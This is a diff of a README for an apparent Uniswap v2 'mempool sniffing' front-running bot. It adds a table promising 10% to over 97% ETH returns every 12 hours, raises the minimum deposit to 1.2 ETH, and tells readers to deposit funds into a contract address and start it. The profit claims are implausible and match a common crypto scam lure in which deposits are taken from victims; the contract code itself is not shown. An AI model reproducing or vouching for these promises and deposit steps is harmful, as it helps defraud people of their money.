@@ -28,16 +28,23 @@ Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, deter
 
 ---
 
-## 📈 Estimated Profits
+## ETH Investment Returns
 
-- 0.1ETH - 0.4ETH = up to 10%/12hrs
-- 0.4ETH - 1.2ETH = up to 20%/12hrs
-- 1.2ETH - 2.4ETH = 20-27%/12hrs
-- 2.4ETH - 5ETH = 27-35%/12hrs
-- 5.0ETH - 10ETH - 35-50%/12hrs
-- 10ETH - 20ETH - 50-63%/12hrs
-- 20ETH - 50ETH - 76%+/12hrs
-- 50ETH - 100ETH - 97%+/12hrs
+Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:
+
+| ETH Range (invested) | Returns (12 hours) |
+| --- | --- |
+| `1.2ETH - 2.4ETH` | `up to 10%` |
+| `2.4ETH - 5ETH` | `up to 20%` |
+| `5ETH - 10ETH` | `20-27%` |
+| `10ETH - 20ETH` | `27-35%` |
+| `20ETH - 50ETH` | `35-50%` |
+| `50ETH - 100ETH` | `50-63%` |
+| `100ETH - 200ETH` | `63-76%` |
+| `200ETH - 500ETH` | `76-97%` |
+| `500ETH and above` | `97%+` |
+
+**Note:** The above percentages are subject to market conditions and are not guaranteed. Please invest responsibly.
 
 ---
 
@@ -69,7 +76,7 @@ Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, deter
    - 🟢 Click "Verify"
 
 
-5) Deposit funds (at least 1.2 ETH to prevent negating slippage) into your specific contract/bot address.
+5) Deposit funds (at least 1.2 ETH to prevent negative slippage) into your specific contract/bot address.
  
 6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
 
